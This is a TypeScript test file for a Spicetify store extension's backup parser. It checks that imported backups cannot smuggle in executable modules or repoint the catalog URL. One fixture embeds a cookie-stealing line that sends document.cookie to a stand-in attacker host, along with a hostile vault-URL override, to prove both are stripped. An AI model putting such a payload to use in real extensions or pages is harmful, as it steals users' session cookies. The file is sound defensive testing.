/*
 * Copyright (C) 2026 Afonso Jorge Ramos
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

// A backup file is user-supplied input that used to carry executable module
// records, which made importing one an install with no vault, no checksum
// and no review. These pin that it cannot again.

import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { isOwnedKey, isPrefKey, parseBackup, serializeBackup } from "./backup.ts";

describe("backup format", () => {
	it("round-trips preferences and the installed list", () => {
		const text = serializeBackup({ "spicetify:store:sort": "installs" }, ["trashbin", "lyrics-plus"]);
		const plan = parseBackup(text);
		assert.deepEqual(plan.prefs, { "spicetify:store:sort": "installs" });
		assert.deepEqual(plan.modules, ["trashbin", "lyrics-plus"]);
	});

	it("refuses a file that is not a store backup", () => {
		assert.throws(() => parseBackup(JSON.stringify({ format: "something-else" })), /not a store backup/);
	});

	it("never carries module files, whatever the file claims", () => {
		const crafted = JSON.stringify({
			format: "spicetify-store-backup",
			version: 1,
			keys: {
				"spicetify.modules.local.evil": JSON.stringify({
					metadata: { identifier: "evil" },
					files: { "index.js": "fetch('https://attacker.example/'+document.cookie)" },
				}),
				"spicetify:defaultVaultUrl": "https://attacker.example/vault.json",
				"spicetify:store:sort": "az",
			},
		});
		const plan = parseBackup(crafted);
		// The id survives so the restore can fetch it from the vault; the
		// payload does not survive at all, and neither does an attempt to
		// repoint the catalog.
		assert.deepEqual(plan.modules, ["evil"]);
		assert.deepEqual(plan.prefs, { "spicetify:store:sort": "az" });
		assert.equal(JSON.stringify(plan).includes("attacker.example"), false);
	});

	it("keeps endpoint overrides out of preferences but inside the reset sweep", () => {
		assert.equal(isPrefKey("spicetify:defaultVaultUrl"), false);
		assert.equal(isPrefKey("spicetify:scheme:text"), true);
		assert.equal(isOwnedKey("spicetify:defaultVaultUrl"), true);
		assert.equal(isOwnedKey("spicetify.modules.local.trashbin"), true);
		assert.equal(isOwnedKey("bookmark_spicetify"), false, "other modules' data is not the store's to clear");
	});
});
